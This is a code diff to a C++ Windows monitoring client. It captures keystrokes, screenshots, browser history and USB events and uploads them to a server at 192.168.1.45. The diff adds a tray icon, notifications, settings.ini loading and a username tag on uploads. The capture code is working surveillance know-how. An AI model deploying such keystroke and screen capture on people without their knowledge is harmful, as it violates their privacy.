@@ -31,6 +31,12 @@ typedef ULONG PROPID;
 #include <iomanip>   // for std::put_time
 #include <iphlpapi.h> // for GetAdaptersInfo
 #include <ShellScalingApi.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+// Windows notification headers
+#include <shellapi.h>
+#include <commctrl.h>
 
 // USB device notification constants (if not defined in MinGW)
 #ifndef DBT_DEVICEARRIVAL
@@ -92,15 +98,24 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #pragma comment(lib, "setupapi.lib")
 #pragma comment(lib, "sqlite3.lib")
 #pragma comment(lib, "Shcore.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
-#define SCREEN_INTERVAL 5
-#define TIC_INTERVAL 30
-#define HISTORY_INTERVAL 120
-#define KEY_INTERVAL 60
+#define SCREEN_INTERVAL 60
+#define TIC_INTERVAL 300
+#define HISTORY_INTERVAL 600
+#define KEY_INTERVAL 300
 #define STORAGE_CHECK_INTERVAL 5
+#define WM_TRAYICON (WM_USER + 1)
+#define ID_TRAY_EXIT 1001
+#define ID_TRAY_STATUS 1002
 
 // Global variables
 std::string macAddress;
+std::string serverIP;
+std::string serverPort;
+std::string username;
 int screenInterval = SCREEN_INTERVAL;
 double lastBrowserTic = -1;
 bool activeRunning = true;
@@ -111,6 +126,26 @@ std::mutex dataMutex;
 HHOOK keyboardHook = NULL;
 HHOOK mouseHook = NULL;
 
+// System tray variables
+NOTIFYICONDATAA nid;
+HMENU hTrayMenu = NULL;
+HWND hMainWindow = NULL;
+
+// Connection status tracking
+struct ConnectionStatus {
+    bool serverConnected = false;
+    bool previousServerConnected = false; // Track previous state for notifications
+    std::string lastScreenshotStatus = "Never";
+    std::string lastTicStatus = "Never";
+    std::string lastHistoryStatus = "Never";
+    std::string lastKeyLogStatus = "Never";
+    std::string lastUSBLogStatus = "Never";
+    std::string lastError = "";
+    std::chrono::steady_clock::time_point lastSuccess = std::chrono::steady_clock::now();
+};
+std::mutex statusMutex;
+ConnectionStatus connectionStatus;
+
 // Browser history tracking - store last fetch times for each browser
 int64_t lastChromeFetch = 0;
 int64_t lastFirefoxFetch = 0;
@@ -120,7 +155,7 @@ int64_t lastEdgeFetch = 0;
 std::ofstream debugLogFile;
 
 // Configuration
-std::string API_BASE_URL = "http://192.168.1.45:8924";
+std::string API_BASE_URL;
 std::string API_ROUTE = "/webapi.php";
 std::string TIC_ROUTE = "/eventhandler.php";
 std::string APP_VERSION = "1.0";
@@ -156,7 +191,7 @@ std::string getCurrentDateTimeString();
 std::string getActiveWindowTitle();
 std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
-void takeScreenshot(const std::string& filePath);
+std::string takeScreenshot();
 bool sendScreenshot(const std::string& filePath);
 bool sendTicEvent();
 bool sendBrowserHistories();
@@ -166,6 +201,7 @@ void collectBrowserHistory();
 void setupKeyboardHook();
 void removeKeyboardHook();
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+std::string getLocalIPAddress();
 LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
 void setupUSBMONITORING();
 void cleanupUSBMONITORING();
@@ -176,6 +212,98 @@ std::string getFirefoxHistory(int64_t sinceTime = 0);
 std::string getEdgeHistory(int64_t sinceTime = 0);
 void monitorTask();
 void writeDebugLog(const std::string& message);
+bool loadSettings();
+void setupSystemTray();
+void cleanupSystemTray();
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+void updateTrayIcon();
+void showConnectionError(const std::string& error);
+bool testServerConnection();
+void showToastNotification(const std::string& title, const std::string& message, const std::string& type = "info");
+void checkConnectionStatusChange();
+void updateTrayMenu();
+
+// Show Windows notification
+void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
+    // Use Windows Shell notification (balloon tip)
+    if (nid.hWnd != NULL) {
+        nid.uFlags = NIF_INFO;
+        nid.dwInfoFlags = (type == "error") ? NIIF_ERROR : NIIF_INFO;
+        strcpy_s(nid.szInfo, message.c_str());
+        strcpy_s(nid.szInfoTitle, title.c_str());
+        
+        if (Shell_NotifyIconA(NIM_MODIFY, &nid)) {
+            writeDebugLog("Windows notification shown successfully: " + title + " - " + message);
+        } else {
+            writeDebugLog("Failed to show Windows notification. Error: " + std::to_string(GetLastError()));
+        }
+    } else {
+        writeDebugLog("System tray not available, cannot show notification");
+    }
+}
+
+// Check for connection status changes and show notifications
+void checkConnectionStatusChange() {
+    std::lock_guard<std::mutex> lock(statusMutex);
+    
+    if (connectionStatus.serverConnected != connectionStatus.previousServerConnected) {
+        if (connectionStatus.serverConnected) {
+            showToastNotification("Server Connected", "Successfully connected to monitoring server", "info");
+        } else {
+            showToastNotification("Server Disconnected", "Lost connection to monitoring server", "error");
+        }
+        connectionStatus.previousServerConnected = connectionStatus.serverConnected;
+    }
+}
+
+// Update tray menu with current status
+void updateTrayMenu() {
+    if (!hTrayMenu) return;
+    
+    // Clear existing menu items
+    while (GetMenuItemCount(hTrayMenu) > 0) {
+        DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
+    }
+    
+    // Show user IP and MAC address
+    std::string userIP = getLocalIPAddress();
+    std::string mac = macAddress;
+    std::string ipMac = "User IP: " + userIP + "  MAC: " + mac;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ipMac.c_str());
+    // Show server IP and port
+    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverInfo.c_str());
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    
+    std::lock_guard<std::mutex> lock(statusMutex);
+    
+    // Add status items
+    std::string serverStatus = std::string("Server: ") + (connectionStatus.serverConnected ? "Connected" : "Disconnected");
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverStatus.c_str());
+    
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    
+    std::string screenshotStatus = std::string("Screenshot: ") + connectionStatus.lastScreenshotStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, screenshotStatus.c_str());
+    
+    std::string ticStatus = std::string("Tic: ") + connectionStatus.lastTicStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ticStatus.c_str());
+    
+    std::string historyStatus = std::string("History: ") + connectionStatus.lastHistoryStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, historyStatus.c_str());
+    
+    std::string keyLogStatus = std::string("Key Log: ") + connectionStatus.lastKeyLogStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, keyLogStatus.c_str());
+    
+    std::string usbLogStatus = std::string("USB Log: ") + connectionStatus.lastUSBLogStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, usbLogStatus.c_str());
+    
+    if (!connectionStatus.lastError.empty()) {
+        AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+        std::string errorStatus = std::string("Error: ") + connectionStatus.lastError;
+        AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, errorStatus.c_str());
+    }
+}
 
 // Setup USB monitoring
 void setupUSBMONITORING() {
@@ -238,6 +366,9 @@ void setupUSBMONITORING() {
                             
                             writeDebugLog("USB Device Connected: " + deviceName + " (" + deviceIdStr + ")");
                             
+                            // Show toast notification for USB device connected
+                            showToastNotification("USB Device Connected", deviceName, "info");
+                            
                             std::lock_guard<std::mutex> lock(dataMutex);
                             usbDeviceLogs.push_back(usbLog);
                         }
@@ -263,6 +394,9 @@ void setupUSBMONITORING() {
                     usbLog["action"] = "Disconnected";
                     
                     writeDebugLog("USB Device Disconnected: " + device);
+                    
+                    // Show toast notification for USB device disconnected
+                    showToastNotification("USB Device Disconnected", "USB device was removed", "warning");
                     
                     std::lock_guard<std::mutex> lock(dataMutex);
                     usbDeviceLogs.push_back(usbLog);
@@ -304,10 +438,20 @@ std::string getMacAddress() {
         return "";
     }
     
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+        free(pAdapterInfo);
+        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
+        if (pAdapterInfo == NULL) {
+            return "";
+        }
+    }
+    
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
         PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
         while (pAdapter) {
-            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
+            // Accept both Ethernet and Wi-Fi adapters
+            if ((pAdapter->Type == MIB_IF_TYPE_ETHERNET || pAdapter->Type == IF_TYPE_IEEE80211) &&
+                pAdapter->AddressLength == 6) {
                 char mac[18];
                 sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                     pAdapter->Address[0], pAdapter->Address[1],
@@ -402,8 +546,8 @@ std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
 // Move GetEncoderClsid declaration up
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 
-// Take screenshot
-void takeScreenshot(const std::string& filePath) {
+// Take screenshot to temporary file
+std::string takeScreenshot() {
     // Get the desktop window handle
     HWND hDesktop = GetDesktopWindow();
     
@@ -427,7 +571,7 @@ void takeScreenshot(const std::string& filePath) {
     // Capture the entire desktop
     BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
     
-    // Save to file using GDI+ with optimized compression
+    // Save to temporary file using GDI+ with optimized compression
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -449,11 +593,14 @@ void takeScreenshot(const std::string& filePath) {
     ULONG quality = 70;
     encoderParams.Parameter[0].Value = &quality;
     
-    std::wstring wFilePath(filePath.begin(), filePath.end());
-    // Change extension to .jpg for JPEG format
-    std::wstring jpgPath = wFilePath.substr(0, wFilePath.find_last_of(L'.')) + L".jpg";
+    // Create temporary file path
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string tempFileName = std::string(tempPath) + "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
     
-    bmp->Save(jpgPath.c_str(), &jpegClsid, &encoderParams);
+    std::wstring wTempFileName(tempFileName.begin(), tempFileName.end());
+    
+    bmp->Save(wTempFileName.c_str(), &jpegClsid, &encoderParams);
     
     delete bmp;
     Gdiplus::GdiplusShutdown(gdiplusToken);
@@ -462,6 +609,8 @@ void takeScreenshot(const std::string& filePath) {
     DeleteObject(hbmScreen);
     DeleteDC(hdcMemory);
     ReleaseDC(NULL, hdcScreen);
+    
+    return tempFileName;
 }
 
 // Move GetEncoderClsid definition above takeScreenshot
@@ -489,6 +638,9 @@ bool sendScreenshot(const std::string& filePath) {
     std::string url = API_BASE_URL + API_ROUTE;
     std::string response = httpPostFile(url, filePath);
     
+    // Delete the temporary file after sending
+    DeleteFileA(filePath.c_str());
+    
     // Parse response
     Json::Value root;
     Json::Reader reader;
@@ -497,9 +649,29 @@ bool sendScreenshot(const std::string& filePath) {
             if (root.isMember("Interval")) {
                 screenInterval = root["Interval"].asInt();
             }
+            
+            // Update connection status
+            {
+                std::lock_guard<std::mutex> lock(statusMutex);
+                connectionStatus.lastScreenshotStatus = getCurrentDateTimeString();
+                connectionStatus.serverConnected = true;
+                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            }
+            updateTrayIcon();
+            checkConnectionStatusChange();
             return true;
         }
     }
+    
+    // Update connection status on failure
+    {
+        std::lock_guard<std::mutex> lock(statusMutex);
+        connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "Screenshot upload failed";
+    }
+    updateTrayIcon();
+    checkConnectionStatusChange();
     
     return false;
 }
@@ -512,6 +684,7 @@ bool sendTicEvent() {
     data["Event"] = "Tic";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["Username"] = username;
     
     Json::FastWriter writer;
     std::string jsonData = writer.write(data);
@@ -525,9 +698,29 @@ bool sendTicEvent() {
             if (root.isMember("LastBrowserTic")) {
                 lastBrowserTic = root["LastBrowserTic"].asDouble();
             }
+            
+            // Update connection status
+            {
+                std::lock_guard<std::mutex> lock(statusMutex);
+                connectionStatus.lastTicStatus = getCurrentDateTimeString();
+                connectionStatus.serverConnected = true;
+                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            }
+            updateTrayIcon();
+            checkConnectionStatusChange();
             return true;
         }
     }
+    
+    // Update connection status on failure
+    {
+        std::lock_guard<std::mutex> lock(statusMutex);
+        connectionStatus.lastTicStatus = "Failed: " + getCurrentDateTimeString();
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "Tic event failed";
+    }
+    updateTrayIcon();
+    checkConnectionStatusChange();
     
     return false;
 }
@@ -542,6 +735,7 @@ bool sendBrowserHistories() {
     data["Event"] = "BrowserHistory";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["Username"] = username;
     data["BrowserHistories"] = Json::Value(Json::arrayValue);
     
     for (const auto& history : browserHistories) {
@@ -559,9 +753,29 @@ bool sendBrowserHistories() {
         if (root.isMember("Status") && root["Status"].asString() == "OK") {
             std::lock_guard<std::mutex> lock(dataMutex);
             browserHistories.clear();
+            
+            // Update connection status
+            {
+                std::lock_guard<std::mutex> lock(statusMutex);
+                connectionStatus.lastHistoryStatus = getCurrentDateTimeString();
+                connectionStatus.serverConnected = true;
+                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            }
+            updateTrayIcon();
+            checkConnectionStatusChange();
             return true;
         }
     }
+    
+    // Update connection status on failure
+    {
+        std::lock_guard<std::mutex> lock(statusMutex);
+        connectionStatus.lastHistoryStatus = "Failed: " + getCurrentDateTimeString();
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "Browser history upload failed";
+    }
+    updateTrayIcon();
+    checkConnectionStatusChange();
     
     return false;
 }
@@ -576,6 +790,7 @@ bool sendKeyLogs() {
     data["Event"] = "KeyLog";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["Username"] = username;
     data["KeyLogs"] = Json::Value(Json::arrayValue);
     
     for (const auto& keyLog : keyLogs) {
@@ -593,9 +808,29 @@ bool sendKeyLogs() {
         if (root.isMember("Status") && root["Status"].asString() == "OK") {
             std::lock_guard<std::mutex> lock(dataMutex);
             keyLogs.clear();
+            
+            // Update connection status
+            {
+                std::lock_guard<std::mutex> lock(statusMutex);
+                connectionStatus.lastKeyLogStatus = getCurrentDateTimeString();
+                connectionStatus.serverConnected = true;
+                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            }
+            updateTrayIcon();
+            checkConnectionStatusChange();
             return true;
         }
     }
+    
+    // Update connection status on failure
+    {
+        std::lock_guard<std::mutex> lock(statusMutex);
+        connectionStatus.lastKeyLogStatus = "Failed: " + getCurrentDateTimeString();
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "Key log upload failed";
+    }
+    updateTrayIcon();
+    checkConnectionStatusChange();
     
     return false;
 }
@@ -615,6 +850,7 @@ bool sendUSBLogs() {
     data["Event"] = "USBLog";
     data["Version"] = APP_VERSION;
     data["MacAddress"] = macAddress;
+    data["Username"] = username;
     data["USBLogs"] = Json::Value(Json::arrayValue);
     
     for (const auto& usbLog : usbDeviceLogs) {
@@ -636,9 +872,29 @@ bool sendUSBLogs() {
         if (root.isMember("Status") && root["Status"].asString() == "OK") {
             std::lock_guard<std::mutex> lock(dataMutex);
             usbDeviceLogs.clear();
+            
+            // Update connection status
+            {
+                std::lock_guard<std::mutex> lock(statusMutex);
+                connectionStatus.lastUSBLogStatus = getCurrentDateTimeString();
+                connectionStatus.serverConnected = true;
+                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            }
+            updateTrayIcon();
+            checkConnectionStatusChange();
             return true;
         }
     }
+    
+    // Update connection status on failure
+    {
+        std::lock_guard<std::mutex> lock(statusMutex);
+        connectionStatus.lastUSBLogStatus = "Failed: " + getCurrentDateTimeString();
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "USB log upload failed";
+    }
+    updateTrayIcon();
+    checkConnectionStatusChange();
     
     return false;
 }
@@ -724,8 +980,14 @@ std::string httpPostFile(const std::string& url, const std::string& filePath) {
     
     std::string formData = "--" + boundary + "\r\n";
     formData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + filePath + "\"\r\n";
-    formData += "Content-Type: image/png\r\n\r\n";
+    formData += "Content-Type: image/jpeg\r\n\r\n";
     formData += fileContent + "\r\n";
+    
+    // Add username to form data
+    formData += "--" + boundary + "\r\n";
+    formData += "Content-Disposition: form-data; name=\"Username\"\r\n\r\n";
+    formData += username + "\r\n";
+    
     formData += "--" + boundary + "--\r\n";
     
     // Create HTTP request
@@ -1143,26 +1405,26 @@ void monitorTask() {
     auto lastHistory = std::chrono::steady_clock::now();
     auto lastKeyLog = std::chrono::steady_clock::now();
     auto lastUSBLog = std::chrono::steady_clock::now();
+    auto lastConnectionTest = std::chrono::steady_clock::now();
     
-    // Create screenshots directory if it doesn't exist
-    std::string screenshotsDir = "screenshots";
-    if (!CreateDirectoryA(screenshotsDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
-        std::cerr << "Warning: Could not create screenshots directory" << std::endl;
+    // Test initial connection
+    if (!testServerConnection()) {
+        showConnectionError("Cannot connect to server: " + API_BASE_URL);
     }
     
     while (activeRunning) {
         auto now = std::chrono::steady_clock::now();
         
+        // Test connection every 60 seconds
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 60) {
+            testServerConnection();
+            lastConnectionTest = now;
+        }
+        
         // Screenshot
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
-            std::string timestamp = getCurrentDateTimeString();
-            std::replace(timestamp.begin(), timestamp.end(), ':', '-');
-            std::replace(timestamp.begin(), timestamp.end(), ' ', '_');
-            
-            std::string screenshotPath = screenshotsDir + "\\screenshot_" + timestamp + ".jpg";
-            takeScreenshot(screenshotPath);
+            std::string screenshotPath = takeScreenshot();
             sendScreenshot(screenshotPath);
-            
             lastScreenshot = now;
         }
         
@@ -1203,10 +1465,22 @@ int main() {
     // Initialize COM for GDI+
     CoInitialize(NULL);
     
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Warning: Could not initialize Winsock" << std::endl;
+    }
+    
     // Get MAC address
     macAddress = getMacAddress();
     if (macAddress.empty()) {
         std::cerr << "Warning: Could not get MAC address" << std::endl;
+    }
+    
+    // Load settings from settings.ini
+    if (!loadSettings()) {
+        std::cerr << "Error: Could not load settings.ini" << std::endl;
+        return 1;
     }
     
     // Setup keyboard monitoring
@@ -1216,15 +1490,24 @@ int main() {
     setupUSBMONITORING();
     writeDebugLog("USB monitoring setup completed");
     
+    // Setup system tray
+    setupSystemTray();
+    writeDebugLog("System tray setup completed");
+    
     // Start monitoring thread
     std::thread monitorThread(monitorTask);
     writeDebugLog("Monitoring thread started");
     
-    // Message loop
+    // Message loop for system tray
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
+        
+        // Check if we should exit
+        if (msg.message == WM_QUIT) {
+            break;
+        }
     }
     
     // Cleanup
@@ -1232,7 +1515,10 @@ int main() {
     monitorThread.join();
     removeKeyboardHook();
     cleanupUSBMONITORING();
+    cleanupSystemTray();
+
     CoUninitialize();
+    WSACleanup();
     
     return 0;
 }
@@ -1245,4 +1531,258 @@ void writeDebugLog(const std::string& message) {
         logFile << "[" << timestamp << "] " << message << std::endl;
         logFile.close();
     }
+} 
+
+// Load settings from settings.ini
+bool loadSettings() {
+    std::ifstream settingsFile("settings.ini");
+    if (!settingsFile.is_open()) {
+        writeDebugLog("settings.ini not found. Using default settings.");
+        serverIP = "192.168.1.45";
+        serverPort = "8924";
+        username = "default_user";
+        API_BASE_URL = "http://" + serverIP + ":" + serverPort;
+        return true;
+    }
+
+    std::string line;
+    std::string currentSection = "";
+    
+    while (std::getline(settingsFile, line)) {
+        // Remove leading/trailing whitespace
+        line.erase(0, line.find_first_not_of(" \t"));
+        line.erase(line.find_last_not_of(" \t") + 1);
+        
+        // Skip empty lines and comments
+        if (line.empty() || line[0] == ';' || line[0] == '#') {
+            continue;
+        }
+        
+        // Check for section headers
+        if (line[0] == '[' && line[line.length()-1] == ']') {
+            currentSection = line.substr(1, line.length()-2);
+            continue;
+        }
+        
+        // Parse key-value pairs
+        size_t equalPos = line.find('=');
+        if (equalPos != std::string::npos) {
+            std::string key = line.substr(0, equalPos);
+            std::string value = line.substr(equalPos + 1);
+            
+            // Remove leading/trailing whitespace from key and value
+            key.erase(0, key.find_first_not_of(" \t"));
+            key.erase(key.find_last_not_of(" \t") + 1);
+            value.erase(0, value.find_first_not_of(" \t"));
+            value.erase(value.find_last_not_of(" \t") + 1);
+            
+            if (currentSection == "Server") {
+                if (key == "ip") {
+                    serverIP = value;
+                } else if (key == "port") {
+                    serverPort = value;
+                } else if (key == "username") {
+                    username = value;
+                }
+            }
+        }
+    }
+    settingsFile.close();
+
+    API_BASE_URL = "http://" + serverIP + ":" + serverPort;
+    writeDebugLog("Loaded settings: ServerIP=" + serverIP + ", ServerPort=" + serverPort + ", Username=" + username);
+    return true;
+}
+
+// Setup system tray
+void setupSystemTray() {
+    // Register window class for the tray icon
+    WNDCLASSEXA wcex;
+    ZeroMemory(&wcex, sizeof(WNDCLASSEXA));
+    wcex.cbSize = sizeof(WNDCLASSEXA);
+    wcex.lpfnWndProc = WindowProc;
+    wcex.hInstance = GetModuleHandleA(NULL);
+    wcex.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
+    wcex.hCursor = LoadCursorA(NULL, (LPCSTR)IDC_ARROW);
+    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+    wcex.lpszClassName = "MonitorTrayIcon";
+    
+    if (!RegisterClassExA(&wcex)) {
+        writeDebugLog("Failed to register window class for tray icon.");
+        return;
+    }
+
+    // Create the main window (hidden)
+    hMainWindow = CreateWindowExA(
+        0, 
+        "MonitorTrayIcon", 
+        "Monitor Client", 
+        WS_OVERLAPPED, 
+        0, 0, 0, 0, 
+        NULL, NULL, 
+        GetModuleHandleA(NULL), 
+        NULL
+    );
+    
+    if (!hMainWindow) {
+        writeDebugLog("Failed to create main window for tray icon.");
+        return;
+    }
+    
+    ShowWindow(hMainWindow, SW_HIDE); // Hide the main window
+
+    // Create the tray icon
+    ZeroMemory(&nid, sizeof(NOTIFYICONDATAA));
+    nid.cbSize = sizeof(NOTIFYICONDATAA);
+    nid.hWnd = hMainWindow;
+    nid.uID = 1; // Unique ID for this icon
+    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
+    nid.uCallbackMessage = WM_TRAYICON;
+    nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
+    strcpy_s(nid.szTip, "Monitor Client");
+
+    if (!Shell_NotifyIconA(NIM_ADD, &nid)) {
+        DWORD error = GetLastError();
+        writeDebugLog("Failed to add tray icon. Error: " + std::to_string(error));
+        return;
+    }
+
+    // Create context menu (will be updated dynamically)
+    hTrayMenu = CreatePopupMenu();
+
+    // Set the tray icon and menu
+    updateTrayIcon();
+    updateTrayMenu();
+    
+    writeDebugLog("System tray setup completed successfully.");
+}
+
+// Cleanup system tray
+void cleanupSystemTray() {
+    Shell_NotifyIconA(NIM_DELETE, &nid);
+    if (hTrayMenu) {
+        DestroyMenu(hTrayMenu);
+        hTrayMenu = NULL;
+    }
+    if (hMainWindow) {
+        DestroyWindow(hMainWindow);
+        hMainWindow = NULL;
+    }
+}
+
+// Window procedure for the main window
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+        case WM_TRAYICON:
+            if (lParam == WM_RBUTTONUP) {
+                POINT pt;
+                GetCursorPos(&pt);
+                SetForegroundWindow(hwnd); // Bring window to foreground
+                updateTrayMenu(); // Update menu with current status
+                TrackPopupMenu(hTrayMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
+            }
+            return 0;
+        case WM_COMMAND:
+            // No menu items to handle
+            return 0;
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            return 0;
+    }
+    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
+}
+
+
+
+// Update tray icon based on connection status
+void updateTrayIcon() {
+    if (connectionStatus.serverConnected) {
+        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
+        nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_INFORMATION); // Green information icon
+        strcpy_s(nid.szTip, "Monitor Client (Connected)");
+    } else {
+        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
+        nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_ERROR); // Red error icon
+        strcpy_s(nid.szTip, "Monitor Client (Disconnected)");
+    }
+    Shell_NotifyIconA(NIM_MODIFY, &nid);
+}
+
+// Show connection error notification
+void showConnectionError(const std::string& error) {
+    showToastNotification("Connection Error", error, "error");
+    connectionStatus.lastError = error;
+    connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+    updateTrayIcon();
+}
+
+// Test server connection
+bool testServerConnection() {
+    std::string url = API_BASE_URL + TIC_ROUTE;
+    std::string response = httpPost(url, "{\"Event\":\"Ping\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
+    
+    Json::Value root;
+    Json::Reader reader;
+    if (reader.parse(response, root)) {
+        if (root.isMember("Status") && root["Status"].asString() == "OK") {
+            connectionStatus.serverConnected = true;
+            connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            updateTrayIcon();
+            checkConnectionStatusChange();
+            return true;
+        } else {
+            connectionStatus.serverConnected = false;
+            connectionStatus.lastError = "Server responded with error: " + response;
+            updateTrayIcon();
+            checkConnectionStatusChange();
+            return false;
+        }
+    } else {
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "Failed to parse server response: " + response;
+        updateTrayIcon();
+        checkConnectionStatusChange();
+        return false;
+    }
+} 
+
+// Helper function to get the local network IPv4 address (robust version)
+std::string getLocalIPAddress() {
+    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
+    if (pAdapterInfo == NULL) {
+        return "Unknown";
+    }
+
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+        free(pAdapterInfo);
+        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
+        if (pAdapterInfo == NULL) {
+            return "Unknown";
+        }
+    }
+
+    std::string foundIP = "Unknown";
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+        while (pAdapter) {
+            PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
+            while (pIPAddr) {
+                std::string ip = pIPAddr->IpAddress.String;
+                // Skip empty, 0.0.0.0, loopback, APIPA, and IPv6-mapped addresses
+                if (!ip.empty() && ip != "0.0.0.0" &&
+                    ip.substr(0, 4) != "127." &&
+                    ip.substr(0, 8) != "169.254." &&
+                    ip.find(':') == std::string::npos) {
+                    foundIP = ip;
+                    break;
+                }
+                pIPAddr = pIPAddr->Next;
+            }
+            if (foundIP != "Unknown") break;
+            pAdapter = pAdapter->Next;
+        }
+    }
+    free(pAdapterInfo);
+    return foundIP;
 } 
